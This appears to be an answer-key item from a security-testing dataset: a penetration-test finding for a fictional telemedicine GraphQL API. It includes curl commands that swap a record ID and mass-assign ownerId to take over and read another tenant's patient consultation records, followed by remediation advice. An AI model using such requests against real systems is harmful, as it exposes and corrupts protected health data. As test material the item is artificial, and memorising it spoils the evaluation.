# Expected Response

## System
- Domain: Telemedicine / Consultation
- System: TeleCare Consultation API
- Example ID: GQL-0086

## Priority Findings

### Finding 1: Telemedicine Consultation Record Takeover via ID Swap + Mass Assignment (Pattern 10.1)
**Severity:** Critical
**Category:** BOLA / Single-User / PHI Exposure

**Summary:**
Per §5.0 (Pattern 10.1 — ID swap in own request): A single authenticated user substitutes their own `resourceId` with a victim patient's `resourceId`. An attacker from `tenant-2a78` issued `updateResource(id: "R-2086", input: {status: "approved", ownerId: "attacker-2a787e6a"})` against a telemedicine consultation record belonging to `tenant-7e6a`. The attack exposes Protected Health Information (PHI) — consultation notes, diagnoses, and treatment plans — while permanently poisoning the record's `ownerId`, violating HIPAA data integrity requirements.

**Evidence from HAR:**
- Request: `POST https://api.telecare-consult.example.com/graphql` (2026-04-13T16:22:34Z)
- JWT `x-tenant-id`: `tenant-2a78`
- Mutation: `updateResource(id: "R-2086", input: {status: "approved", ownerId: "attacker-2a787e6a"}) { resourceId status }`
- Response `200 OK`; cross-tenant PHI: `tenantId: "tenant-7e6a"`, `sensitiveField: "CONFIDENTIAL-2a787e6a"`, `internalNotes: "Internal data exposed"`
- `x-request-id: req-2a787e6a`

## Steps to Reproduce

### Step 1 — ID swap + mass assignment on consultation record (HAR)
```bash
curl -s -X POST https://api.telecare-consult.example.com/graphql \
  -H "Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c3Jfe3VpZH0iLCJyb2xlIjoie3JvbGV9IiwidGVuYW50X2lkIjoie3RlbmFudH0ifQ.SIG" \
  -H "Content-Type: application/json" -H "x-tenant-id: tenant-2a78" \
  -d '{"query": "mutation { updateResource(id: \"R-2086\", input: {status: \"approved\", ownerId: \"attacker-2a787e6a\"}) { resourceId status } }"}'
```
**Vulnerable:** PHI from `tenant-7e6a` returned; `ownerId` poisoned. **Secure:** FORBIDDEN.

### Step 2 — Read victim consultation via ID swap
```bash
curl -s -X POST https://api.telecare-consult.example.com/graphql \
  -H "Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c3Jfe3VpZH0iLCJyb2xlIjoie3JvbGV9IiwidGVuYW50X2lkIjoie3RlbmFudH0ifQ.SIG" \
  -H "Content-Type: application/json" -H "x-tenant-id: tenant-2a78" \
  -d '{"query": "query { getResource(id: \"R-2086\") { resourceId tenantId ownerId data { sensitiveField internalNotes } } }"}'
```
**Vulnerable:** PHI from another patient/tenant.

## Remediation
1. Resolver tenant guard: `WHERE resource_id=$id AND tenant_id=$jwt.tenantId`.
2. Strip `ownerId` from `ResourceInput` — never client-writable for PHI records.
3. Return HTTP 404 for non-owned IDs to avoid confirming existence of PHI records.
4. Redis cache key: `resource:{tenantId}:{resourceId}`.
